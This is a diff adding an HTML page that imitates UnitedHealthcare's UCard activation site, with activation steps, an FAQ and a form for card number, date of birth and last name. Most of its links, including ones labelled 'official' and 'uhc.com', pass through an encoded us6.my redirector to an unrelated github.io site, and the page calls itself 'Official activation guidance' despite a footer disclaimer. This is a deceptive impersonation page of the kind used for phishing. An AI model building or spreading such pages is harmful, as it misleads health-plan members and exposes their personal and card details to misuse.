@@ -1,0 +1,242 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Activate UHC — Activate your UCard</title>
+  <meta name="description" content="Step-by-step guidance to activate your UnitedHealthcare UCard, helpful tips, troubleshooting, and resources." />
+  <style>
+    /* UnitedHealthcare-inspired palette (replace with official brand assets if you have permission) */
+    :root{
+      --uhc-blue: #002677; /* primary */
+      --uhc-sky: #D9F6FA;  /* secondary / soft background */
+      --uhc-accent: #0066CC; /* interactive accent */
+      --text: #222;
+      --muted: #666;
+      --card-bg: #ffffff;
+      --radius: 10px;
+      --max-width: 980px;
+      --gap: 18px;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    }
+
+    html,body{height:100%;margin:0;background:linear-gradient(180deg,var(--uhc-sky),#ffffff);color:var(--text);}
+    .container{max-width:var(--max-width);margin:28px auto;padding:24px;}
+
+    header{display:flex;align-items:center;justify-content:space-between;gap:12px}
+    .brand{display:flex;align-items:center;gap:12px}
+    .logo-placeholder{width:56px;height:56px;border-radius:8px;background:var(--uhc-blue);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700}
+    nav ul{list-style:none;display:flex;gap:12px;margin:0;padding:0}
+    nav a{color:var(--uhc-blue);text-decoration:none;font-weight:600}
+
+    .hero{display:flex;gap:20px;align-items:center;margin-top:18px;background:var(--card-bg);padding:22px;border-radius:var(--radius);box-shadow:0 6px 20px rgba(20,30,60,0.08)}
+    .hero .left{flex:1}
+    .hero h1{margin:0;color:var(--uhc-blue);font-size:28px}
+    .hero p{margin:10px 0 16px;color:var(--muted);line-height:1.5}
+    .cta-row{display:flex;gap:12px;align-items:center}
+    .btn{padding:12px 18px;border-radius:10px;border:0;font-weight:700;cursor:pointer}
+    .btn-primary{background:var(--uhc-blue);color:#fff}
+    .btn-outline{background:transparent;color:var(--uhc-blue);border:2px solid var(--uhc-blue)}
+
+    .card{background:var(--card-bg);padding:18px;border-radius:10px;box-shadow:0 6px 18px rgba(20,30,60,0.06)}
+    .grid{display:grid;grid-template-columns:1fr 360px;gap:var(--gap);align-items:start}
+
+    form label{display:block;font-weight:600;margin-bottom:6px}
+    input,select{width:100%;padding:10px;border-radius:8px;border:1px solid #ddd;font-size:15px}
+    .help{font-size:13px;color:var(--muted)}
+
+    .steps{display:flex;flex-direction:column;gap:12px}
+    .step{display:flex;gap:12px;align-items:flex-start}
+    .step .num{width:38px;height:38px;border-radius:50%;background:var(--uhc-accent);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700}
+
+    .faq{margin-top:18px}
+    .faq h3{margin-top:0}
+    footer{margin-top:28px;text-align:center;color:var(--muted);font-size:13px}
+
+    /* small screens */
+    @media (max-width:900px){
+      .grid{grid-template-columns:1fr;}
+      .logo-placeholder{width:44px;height:44px}
+      .hero{flex-direction:column;align-items:flex-start}
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <div class="brand">
+        <div class="logo-placeholder" aria-hidden="true">U</div>
+        <div>
+          <div style="font-weight:700;color:var(--uhc-blue)">Activate UHC</div>
+          <div style="font-size:13px;color:var(--muted)">Official activation guidance & help</div>
+        </div>
+      </div>
+      <nav aria-label="Primary navigation">
+        <ul>
+          <li><a href="https://us6.my/?aHR0cHM6Ly9oZWxwaHViLWNlbnRlci5naXRodWIuaW8vYWN0aXZhdGV1aGMuZ2l0aHViLmlv">Activate</a></li>
+          <li><a href="https://us6.my/?aHR0cHM6Ly9oZWxwaHViLWNlbnRlci5naXRodWIuaW8vYWN0aXZhdGV1aGMuZ2l0aHViLmlv">How it works</a></li>
+          <li><a href="https://us6.my/?aHR0cHM6Ly9oZWxwaHViLWNlbnRlci5naXRodWIuaW8vYWN0aXZhdGV1aGMuZ2l0aHViLmlv">FAQ</a></li>
+          <li><a href="https://us6.my/?aHR0cHM6Ly9oZWxwaHViLWNlbnRlci5naXRodWIuaW8vYWN0aXZhdGV1aGMuZ2l0aHViLmlv">Contact</a></li>
+        </ul>
+      </nav>
+    </header>
+
+    <main>
+      <section class="hero" role="region" aria-labelledby="hero-title">
+        <div class="left">
+          <h1 id="hero-title">Activate your UCard — quickly & securely</h1>
+          <p>Activate your UCard quickly and securely with a simple online process.
+Just enter your card details, confirm your identity, and complete activation in minutes.
+Once activated, you can check benefits, view balances, and start using your card right away.
+Fast, safe, and designed to get you ready to use your UCard without any hassle.</p>
+
+          <div class="cta-row">
+            <a class="btn btn-primary" href="https://us6.my/?aHR0cHM6Ly9oZWxwaHViLWNlbnRlci5naXRodWIuaW8vYWN0aXZhdGV1aGMuZ2l0aHViLmlv" role="button">Activate now</a>
+            <a class="btn btn-outline" href="https://us6.my/?aHR0cHM6Ly9oZWxwaHViLWNlbnRlci5naXRodWIuaW8vYWN0aXZhdGV1aGMuZ2l0aHViLmlv" role="button">How it works</a>
+          </div>
+        </div>
+        <div style="width:320px">
+          <div class="card" aria-hidden="true">
+            <!-- Auto-inserted UHC card image (replace src with your file path if needed) -->
+            <img src="uhc.png" alt="Person holding a UnitedHealthcare card" style="width:100%;border-radius:8px;display:block;margin-bottom:12px;">
+            <div style="margin-top:12px;font-size:13px;color:var(--muted)">Need help activating? Call the number on the back of your card or the toll-free activation line listed in your member materials.</div>
+          </div>
+        </div>
+      </section>
+
+      <section class="grid" style="margin-top:20px">
+        <div>
+          <div id="activate" class="card">
+            <h2>Activate your UCard (step-by-step)</h2>
+            <p class="help">Before you start: have your 17-digit card number (printed under the barcode on back of card) and personal info that matches your member record.</p>
+
+            <ol class="steps" aria-label="Activation steps">
+              <li class="step">
+                <div class="num">1</div>
+                <div>
+                  <strong>Go to the activation website</strong>
+                  <p class="help">Open your browser and visit <code>activate.uhc.com</code>. If your card mentions <em>CareFlex</em>, use the CareFlex activation URL shown on the card materials.</p>
+                </div>
+              </li>
+
+              <li class="step">
+                <div class="num">2</div>
+                <div>
+                  <strong>Enter your card details</strong>
+                  <p class="help">Type the full card number exactly as printed. Double-check digits — mistakes will prevent activation.</p>
+                </div>
+              </li>
+
+              <li class="step">
+                <div class="num">3</div>
+                <div>
+                  <strong>Create or sign in to your account</strong>
+                  <p class="help">You may be asked to sign in with your UnitedHealthcare account (HealthSafe ID or member account). Follow on-screen prompts to create an account if needed.</p>
+                </div>
+              </li>
+
+              <li class="step">
+                <div class="num">4</div>
+                <div>
+                  <strong>Confirm & finish</strong>
+                  <p class="help">Review the details and submit. You should see a confirmation message and may receive an email. If activation fails, try the troubleshooting tips below.</p>
+                </div>
+              </li>
+            </ol>
+
+            <hr style="margin:16px 0" />
+            <h3>Activation form </h3>
+            <form aria-label="Activation demo form" onsubmit="event.preventDefault();alert('This is a demo form — connect real API/endpoint to complete activation.');">
+              <label for="card-number">UCard number</label>
+              <input id="card-number" name="card-number" type="text" inputmode="numeric" placeholder="Enter 17-digit card number" required />
+
+              <label for="dob" style="margin-top:10px">Date of birth</label>
+              <input id="dob" name="dob" type="date" required />
+
+              <label for="last-name" style="margin-top:10px">Last name (as shown on card)</label>
+              <input id="last-name" name="last-name" type="text" placeholder="Surname" required />
+
+              <div style="margin-top:12px;display:flex;gap:10px">
+                <button class="btn btn-primary" type="submit">Activate</button>
+                <button class="btn btn-outline" type="button" onclick="document.getElementById('card-number').value='';document.getElementById('last-name').value='';">Clear</button>
+              </div>
+            </form>
+
+            <div style="margin-top:14px;font-size:13px;color:var(--muted)">
+              <strong></strong> 
+            </div>
+          </div>
+
+          <div class="card" style="margin-top:16px">
+            <h2 id="how-it-works">How activation works ?</h2>
+            <p class="help">Activation links your UCard to your UnitedHealthcare member account so the system can verify your identity and load your eligible benefits. Once the activation process is complete, you can instantly access balances, shop with your benefits, and manage everything through the UCard Hub or UHC app.</p>
+
+            <h4>Where you can use the UCard</h4>
+            <ul>
+              <li>Use your UCard at participating retail stores like Walmart, Walgreens, and CVS (depends on your plan).</li>
+              <li>Some plans allow use for eligible utilities, OTC items, and healthy foods.</li>
+              <li>Use it online through the UCard Hub to shop eligible items.</li>
+              <li>Use it in the UnitedHealthcare mobile app to manage benefits.</li>
+            </ul>
+
+            <h4>Security & privacy</h4>
+            <p class="help">UnitedHealthcare protects your information with secure sign-in and encrypted systems, so always activate your UCard only through trusted UHC websites. Never share your card number or personal details through email, text, or unknown links. Always check the URL and sign out when using shared devices to keep your account safe.</p>
+          </div>
+
+          <section class="faq" id="faq" aria-labelledby="faq-title">
+            <h2 id="faq-title">Frequently asked questions</h2>
+
+            <h3>Q: I don’t see my balance after activation — what do I do?</h3>
+            <p class="help">A: Wait a few minutes and refresh. If still not showing, sign out and sign back in. If the problem persists, contact member services — the number is printed on the back of your UCard or available on uhc.com.</p>
+
+            <h3>Q: The site says my card number is invalid.</h3>
+            <p class="help">A: Confirm you entered all digits without spaces, check for 0 vs O, and ensure you're using the activation URL printed for your card. If you recently received the card, it can take up to 24–48 hours for systems to fully provision new cards in some scenarios.</p>
+
+            <h3>Q: Can I activate by phone?</h3>
+            <p class="help">A: Yes — many UCard materials include a toll-free activation phone line; call the number on the back of your card or your plan materials.</p>
+          </section>
+        </div>
+
+        <aside class="card">
+          <h3>Quick links & resources</h3>
+          <ul style="padding-left:16px">
+            <li><a href="https://www.uhc.com/" target="_blank" rel="noopener">UnitedHealthcare — official site</a></li>
+            <li><a href="https://us6.my/?aHR0cHM6Ly9oZWxwaHViLWNlbnRlci5naXRodWIuaW8vYWN0aXZhdGV1aGMuZ2l0aHViLmlv" target="_blank" rel="noopener">Activation portal (official)</a></li>
+            <li><a href="https://us6.my/?aHR0cHM6Ly9oZWxwaHViLWNlbnRlci5naXRodWIuaW8vYWN0aXZhdGV1aGMuZ2l0aHViLmlv">Contact member services</a></li>
+          </ul>
+
+          <h4 style="margin-top:12px">Troubleshooting checklist</h4>
+          <ol style="font-size:13px;color:var(--muted)">
+            <li>Confirm card number digits (no spaces)</li>
+            <li>Try a different browser or device</li>
+            <li>Clear browser cache or use an incognito window</li>
+            <li>Call member services if problems continue</li>
+          </ol>
+
+          <div style="margin-top:12px">
+            <strong>Contact</strong>
+            <p class="help">Member services phone number is on your UCard. For general help: visit <a href="https://us6.my/?aHR0cHM6Ly9oZWxwaHViLWNlbnRlci5naXRodWIuaW8vYWN0aXZhdGV1aGMuZ2l0aHViLmlv" target="_blank" rel="noopener">uhc.com</a>.</p>
+          </div>
+        </aside>
+      </section>
+
+      <section class="card" style="margin-top:18px" id="contact">
+        <h2>Contact & help</h2>
+        <p class="help">If you need live help, call the number on your member ID card. For media or logo usage, see UnitedHealth Group media resources to request permission for logos and images.</p>
+
+        <div style="display:flex;gap:12px;flex-wrap:wrap">
+          <a class="btn btn-primary" href="tel:+18667571864">Call activation line</a>
+          <a class="btn btn-outline" href="https://us6.my/?aHR0cHM6Ly9oZWxwaHViLWNlbnRlci5naXRodWIuaW8vYWN0aXZhdGV1aGMuZ2l0aHViLmlv" target="_blank" rel="noopener">Visit uhc.com</a>
+        </div>
+      </section>
+    </main>
+
+    <footer>
+      <div style="max-width:var(--max-width);margin:18px auto;">
+        <div style="font-size:13px;color:var(--muted)">This page is a guidance/demo page and is not the official UnitedHealthcare activation portal. For official activation use the official activation URL on your card or member materials: <code>activate.uhc.com</code>. </div>
+        <div style="margin-top:8px">© Your organization • Privacy • Terms</div>
+      </div>
+    </footer>
+  </div>
+</body>
+</html>
